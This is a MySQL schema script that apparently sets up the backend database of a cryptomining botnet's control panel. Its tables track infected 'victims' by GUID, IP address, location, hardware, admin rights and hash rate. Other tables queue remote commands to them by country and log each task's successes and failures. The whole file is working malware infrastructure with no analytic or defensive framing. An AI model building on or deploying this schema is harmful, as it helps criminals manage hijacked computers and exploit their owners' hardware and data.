USE u982446829_ywn;
SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


CREATE TABLE `access_log` (
	`ID` int(11) NOT NULL AUTO_INCREMENT,
	`Referer` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
	`UserAgent` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
	`IP` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
	`AccessDate` int(10) NOT NULL,
	`reset` tinyint(1) NOT NULL,
	PRIMARY KEY (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

CREATE TABLE IF NOT EXISTS `debuglog` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `GUID` BINARY(16) NOT NULL,
  `message` text COLLATE utf8_unicode_ci NOT NULL,
  `creationDate` datetime NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1;


CREATE TABLE IF NOT EXISTS `plugins` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `GUID` BINARY(16) NOT NULL,
  `Plugin` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `settings` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `File` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Parameters` text COLLATE utf8_unicode_ci NOT NULL,
  `Single` varchar(10) COLLATE utf8_unicode_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;


--  `GUIDs` text COLLATE utf8_unicode_ci NOT NULL,
CREATE TABLE IF NOT EXISTS `tasks` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `SpecGUID` text COLLATE utf8_unicode_ci NOT NULL,
  `Countries` text COLLATE utf8_unicode_ci NOT NULL,
  `Command` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Parameter` text COLLATE utf8_unicode_ci NOT NULL,
  `Start` int(10) NOT NULL DEFAULT '0',
  `Stop` int(10) NOT NULL DEFAULT '0',
  `Count` int(10) NOT NULL DEFAULT '0',
  `Received` int(10) NOT NULL,
  `Executed` int(10) NOT NULL DEFAULT '0',
  `Fails` int(10) NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `tasks_victims` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `GUID` BINARY(16) NOT NULL,
  `TaskId` int(11) NOT NULL,
  `executed` tinyint(1) NOT NULL default 0,
  `success` tinyint(1) NOT NULL default 0,
  `failed` tinyint(1) NOT NULL default 0,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `victims` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `GUID` BINARY(16) NOT NULL,
  `BuildID` varchar(10) COLLATE utf8_unicode_ci NOT NULL,
  `TaskID` int(11) NOT NULL DEFAULT '0',
  `Free` int(1) NOT NULL DEFAULT '1',
  `Connected` int(10) NOT NULL,
  `PCName` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `CPUName` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `GPUName` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `OS` tinyint(3) unsigned NOT NULL,
  `Admin` varchar(1) COLLATE utf8_unicode_ci NOT NULL,
  `IP` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `HashRate` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `Country` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `CountryLong` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `Region` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `City` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `Time` int(11) NOT NULL,
  `Online` int(1) NOT NULL DEFAULT '1',
  `creationDate` datetime NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `operating_system` (
  `osId` tinyint(3) unsigned NOT NULL,
  `osmajor` tinyint(3) unsigned NOT NULL,
  `osminor` tinyint(3) unsigned NOT NULL,
  `osname` varchar(100) NOT NULL,
  `osversion` varchar(30) NOT NULL,
  PRIMARY KEY (`osId`)
) ENGINE=MyISAM DEFAULT CHARSET=ucs2;


INSERT INTO `operating_system` (`osId`, `osmajor`, `osminor`, `osname`, `osversion`) VALUES
	(1, 6, 2, 'Windows 8', '32-Bit'),
	(2, 6, 2, 'Windows 8', '64-Bit'),
	(3, 6, 2, 'Windows Server 2012', '64-Bit'),
	(4, 6, 1, 'Windows 7', '32-Bit'),
	(5, 6, 1, 'Windows 7', '64-Bit'),
	(6, 6, 1, 'Windows Server 2008 R2', '64-Bit'),
	(7, 6, 0, 'Windows Server 2008', '32-Bit'),
	(8, 6, 0, 'Windows Server 2008', '64-Bit'),
	(9, 6, 0, 'Windows Vista', '32-Bit'),
	(10, 6, 0, 'Windows Vista', '64-Bit'),
	(11, 5, 2, 'Windows Server 2003 R2', '32-Bit'),
	(12, 5, 2, 'Windows Home Server', '32-Bit'),
	(13, 5, 2, 'Windows Server 2003', '32-Bit'),
	(14, 5, 2, 'Windows XP', '64-Bit'),
	(15, 5, 1, 'Windows XP', '32-Bit'),
	(16, 5, 0, 'Windows 2000', '32-Bit'),
	(17, 6, 3, 'Windows 8.1', '32-Bit'),
	(18, 6, 3, 'Windows 8.1', '64-Bit'),
	(19, 0, 0, 'UNKNOWN', '');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;


